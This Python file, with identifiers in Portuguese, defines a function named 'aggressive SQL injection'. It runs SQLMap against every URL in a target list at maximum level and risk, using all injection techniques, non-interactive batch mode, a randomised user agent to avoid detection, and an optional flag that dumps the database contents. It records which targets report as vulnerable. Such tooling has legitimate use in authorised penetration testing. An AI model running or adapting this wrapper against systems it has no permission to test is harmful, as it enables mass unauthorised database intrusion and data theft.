import subprocess
import logging

logger = logging.getLogger(__name__)


def sql_injection_agressivo(alvos, session, sqlmap_path='sqlmap', dbms=None, dump=False, tech='BEUSTQ', level=5, risk=3):
    """
    Executa SQLMap em todos os alvos com parâmetros.
    """
    resultados = {'vulneraveis': [], 'falhas': []}

    for alvo in alvos:
        url = alvo['url']
        method = alvo.get('method', 'GET')
        params = alvo.get('params', {})

        # Monta comando SQLMap
        cmd = [
            sqlmap_path,
            '-u', url,
            f'--level={level}',
            f'--risk={risk}',
            f'--technique={tech}',
            '--batch',
            '--random-agent',
            '--threads=10',
            '--output-dir=./sqlmap_output'
        ]

        if method == 'POST' and params:
            data = '&'.join([f"{k}={v}" for k, v in params.items()])
            cmd.extend(['--data', data])

        if dbms:
            cmd.extend(['--dbms', dbms])

        if dump:
            cmd.append('--dump')

        try:
            logger.info(f"Executando SQLMap em {url}")
            resultado = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if 'vulnerable' in resultado.stdout.lower():
                resultados['vulneraveis'].append({
                    'url': url,
                    'saida': resultado.stdout[:500]
                })
            else:
                resultados['falhas'].append(url)
        except Exception as e:
            logger.error(f"Erro no SQLMap para {url}: {e}")

    return resultados